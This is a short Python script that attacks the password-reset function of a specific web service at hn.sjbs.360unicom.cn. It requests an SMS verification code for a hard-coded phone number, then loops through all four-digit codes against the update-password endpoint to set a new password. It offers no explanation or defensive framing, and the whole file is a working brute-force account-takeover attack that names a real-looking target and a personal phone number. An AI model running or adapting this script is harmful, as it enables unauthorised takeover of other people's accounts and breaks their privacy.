# -*- coding: utf-8 -*-
# @__author__:choppa
# @DATA 2022/12/21
# @software:PyCharm
import hashlib
import time

import requests


def get_md5(pwd):
    md5= hashlib.md5()
    md5.update(pwd.encode('utf-8'))
    return md5.hexdigest()


def sendcode():
    url = "http://hn.sjbs.360unicom.cn/api/blade-auth/sendCode"
    data = {"phone": "13387158045"}
    resp = requests.post(url, json=data)
    print(resp.text)


def brutefore(newpwd,code):
    url = "http://hn.sjbs.360unicom.cn/api/blade-user/phone/update-password"
    data = {"newPassword": get_md5(newpwd), "newPassword1": get_md5(newpwd),
            "phone": "13387158045", "code": code}
    rep = requests.post(url, json=data)
    print(rep.json())
    return rep.json()['code']


if __name__ == '__main__':
    sendcode()
    T = time.time()
    time.sleep(10)
    for i in range(1, 10000):
        if i > 0 and i % 100 == 0:
            pass
        if time.time() > T + 5*60:
            break
        if str(brutefore("123qwe", str(i).zfill(4))) == "200":
            print("密码重置成功")
            break
